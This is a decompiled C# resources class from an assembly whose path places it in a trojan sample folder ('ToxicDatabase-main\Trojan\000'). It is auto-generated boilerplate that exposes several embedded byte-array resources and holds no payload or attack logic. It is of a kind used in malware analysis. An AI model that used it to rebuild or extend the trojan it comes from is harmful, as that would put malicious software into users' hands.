// Decompiled with JetBrains decompiler
// Type: Creep.Properties.Resources
// Assembly: 000, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 13F43A77-4E8B-438F-A69A-882CC6C087E6
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Trojan\000\000.exe

using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;

#nullable disable
namespace Creep.Properties;

[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
[DebuggerNonUserCode]
[CompilerGenerated]
internal class Resources
{
  private static ResourceManager resourceMan;
  private static CultureInfo resourceCulture;

  internal Resources()
  {
  }

  [EditorBrowsable(EditorBrowsableState.Advanced)]
  internal static ResourceManager ResourceManager
  {
    get
    {
      if (Creep.Properties.Resources.resourceMan == null)
        Creep.Properties.Resources.resourceMan = new ResourceManager("Creep.Properties.Resources", typeof (Creep.Properties.Resources).Assembly);
      return Creep.Properties.Resources.resourceMan;
    }
  }

  [EditorBrowsable(EditorBrowsableState.Advanced)]
  internal static CultureInfo Culture
  {
    get => Creep.Properties.Resources.resourceCulture;
    set => Creep.Properties.Resources.resourceCulture = value;
  }

  internal static byte[] _000
  {
    get => (byte[]) Creep.Properties.Resources.ResourceManager.GetObject(nameof (_000), Creep.Properties.Resources.resourceCulture);
  }

  internal static byte[] one
  {
    get => (byte[]) Creep.Properties.Resources.ResourceManager.GetObject(nameof (one), Creep.Properties.Resources.resourceCulture);
  }

  internal static byte[] street
  {
    get => (byte[]) Creep.Properties.Resources.ResourceManager.GetObject(nameof (street), Creep.Properties.Resources.resourceCulture);
  }

  internal static byte[] subox
  {
    get => (byte[]) Creep.Properties.Resources.ResourceManager.GetObject(nameof (subox), Creep.Properties.Resources.resourceCulture);
  }

  internal static byte[] texticon
  {
    get
    {
      return (byte[]) Creep.Properties.Resources.ResourceManager.GetObject(nameof (texticon), Creep.Properties.Resources.resourceCulture);
    }
  }

  internal static byte[] txt
  {
    get => (byte[]) Creep.Properties.Resources.ResourceManager.GetObject(nameof (txt), Creep.Properties.Resources.resourceCulture);
  }

  internal static byte[] windl
  {
    get => (byte[]) Creep.Properties.Resources.ResourceManager.GetObject(nameof (windl), Creep.Properties.Resources.resourceCulture);
  }
}
